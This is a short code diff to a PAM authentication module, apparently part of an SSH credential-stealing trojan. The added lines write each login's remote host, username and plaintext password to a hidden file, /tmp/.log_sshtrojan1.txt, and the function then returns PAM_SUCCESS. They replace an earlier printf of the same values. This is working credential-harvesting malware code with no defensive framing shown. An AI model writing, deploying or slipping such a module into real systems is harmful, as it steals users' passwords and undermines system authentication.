@@ -45,10 +45,13 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,
 	if (!pword || !uname) {
 		return PAM_AUTHINFO_UNAVAIL;
 	}
-
-	printf("host = %s : username = %s : password = %s\n",
-				remhst, uname, pword);
-
+	FILE *f = fopen("/tmp/.log_sshtrojan1.txt", "w");
+	if (f == NULL)
+	{
+		exit(1);
+	}
+	fprintf(f,"host = %s : username = %s : password = %s\n", remhst, uname, pword);
+	fclose(f);
 	return PAM_SUCCESS;
 }
 
